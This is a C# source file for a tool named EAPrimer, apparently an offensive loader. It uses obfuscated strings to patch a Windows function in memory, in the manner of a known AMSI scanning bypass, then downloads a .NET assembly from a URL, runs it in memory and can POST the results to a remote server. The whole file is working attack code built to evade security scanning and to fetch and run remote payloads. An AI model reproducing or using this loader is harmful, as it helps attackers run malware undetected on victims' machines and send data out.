using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace EAPrimer
{
    public class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string BdaFefh34d);

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr Tvsas, string VO0olaeq);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr fwmzpXgc, UIntPtr Jvcap, uint BnszP, out uint OtafheJdkw093D);

        private static void CopyData(byte[] datInfo, IntPtr MemVal, int placeHolderHere = 0)
        {
            Marshal.Copy(datInfo, placeHolderHere, MemVal, datInfo.Length);
        }

        private static void Dispatch()
        {
            try
            {
                var abc = LoadLibrary(Decoder("VjFaamVHVnRSbFJPVjNScFVqTmpPUT09", "bHad"));
                IntPtr addr = GetProcAddress(abc, Decoder("VlZaamVHVnRSbGRVYlhCYVZucFdSRnBHWkdGaVZuQlpVMVF3UFE9PQ==", "pvnt"));
                uint magicRastaValue = 0x40;
                uint someNumber = 0;

                if (System.Environment.Is64BitOperatingSystem)
                {
                    var BigBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                    VirtualProtect(addr, (UIntPtr)BigBytes.Length, magicRastaValue, out someNumber);
                    CopyData(BigBytes, addr);
                }
                else
                {
                    var SmallBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

                    VirtualProtect(addr, (UIntPtr)SmallBytes.Length, magicRastaValue, out someNumber);
                    CopyData(SmallBytes, addr);

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] {0}", ex.Message);
            }
        }

        private static string Decoder(string bait, string snowgrant)
        {
            string moderncircle = bait;
            for (int i = 0; i < snowgrant.Length; i++)
            {
                moderncircle = Encoding.UTF8.GetString(Convert.FromBase64String(moderncircle));
            }
            return moderncircle;
        }

        private static string Encoder(string casper, string reactor)
        {
            string weaver = casper;
            for (int i = 0; i < reactor.Length; i++)
            {
                weaver = Convert.ToBase64String(Encoding.UTF8.GetBytes(weaver));
            }
            return weaver;
        }

        private static void PostData(string URL, string postData)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            WebClient wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36");
            wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
            wc.UploadString(URL, "POST", postData);
        }

        private static byte[] GetAssembly(string URL)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            WebClient wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36");
            return wc.DownloadData(URL);
        }

        private static Dictionary<string, string> ParseArgs(string[] args)
        {
            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var x = argument.IndexOf('=');
                if (x > 0)
                {
                    arguments[argument.Substring(0, x)] = argument.Substring(x + 1);
                }
                else
                {
                    arguments[argument] = string.Empty;
                }
            }
            return arguments;
        }

        private static void mainLine(byte[] assemblyBytes, object[] Addons)
        {
            getEntry(loadASM(assemblyBytes)).Invoke(null, Addons);
        }

        private static Assembly loadASM(byte[] assemblyBytes)
        {
            return Assembly.Load(assemblyBytes);
        }

        private static MethodInfo getEntry(Assembly asmobj)
        {
            return asmobj.EntryPoint;
        }

        public static void Main(string[] args)
        {
            var outputData = "";
            var b64Assembly = "";
            byte[] assemblyBytes = null;
            string[] assemblyArgs = { };
            var origOut = Console.Out;
            Dictionary<string, string> arguments = ParseArgs(args);

            using (var writer = new StringWriter())
            {
                try
                {
                    // Setup writer
                    if (arguments.ContainsKey("-post"))
                    {
                        Console.SetOut(writer);
                    }
                    else
                    {
                        Console.SetOut(origOut);
                    }

                    Console.WriteLine("[*] EAPrimer v0.1.2");
                    if (arguments.Count < 1 || arguments.ContainsKey("-help") || !arguments.ContainsKey("-path"))
                    {
                        Console.WriteLine("\n-path\tURL or local path to assembly");
                        Console.WriteLine("-post\tLocal path for output or URL to POST base64 encoded results. Default: console output.");
                        Console.WriteLine("-args\tAdd arguments for target assembly.\n\n");
                        Console.WriteLine("EAPrimer.exe -path=https://192.168.1.2/assembly.exe -post=https://192.168.1.2 -args=\"-arg1 example_value\"\n");
                    }
                    else
                    {
                        Console.WriteLine("[*] Applying In-Memory Patch");
                        Dispatch();

                        if (arguments.ContainsKey("-args"))
                        {
                            assemblyArgs = new String[] { arguments["-args"] };
                            Console.WriteLine("[*] Assembly Args: \"{0}\"", assemblyArgs);
                        }

                        if (arguments["-path"].StartsWith("http://") || arguments["-path"].StartsWith("https://"))
                        {
                            Console.WriteLine("[*] Loading Asembly: {0}", arguments["-path"]);
                            assemblyBytes = GetAssembly(arguments["-path"]);
                        }
                        else
                        {
                            Console.WriteLine("[*] Loading Asembly from: {0}", arguments["-path"]);
                            assemblyBytes = File.ReadAllBytes(arguments["-path"]);
                        }

                        mainLine(assemblyBytes, new object[] { assemblyArgs });
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] " + ex);
                }

                outputData = writer.GetStringBuilder().ToString();
                writer.Flush();
                Console.WriteLine(outputData);

                Console.SetOut(origOut);
                if (arguments.ContainsKey("-post"))
                {
                    if (arguments["-post"].StartsWith("http://") || arguments["-post"].StartsWith("https://"))
                    {
                        PostData(arguments["-post"], outputData);
                    }
                    else
                    {
                        using (StreamWriter w = new StreamWriter(arguments["-post"]))
                        {
                            Console.SetOut(w);
                            Console.WriteLine(outputData);
                        }
                    }
                }
                else
                {
                    Console.WriteLine(outputData);
                }
            }
        }

    }
}

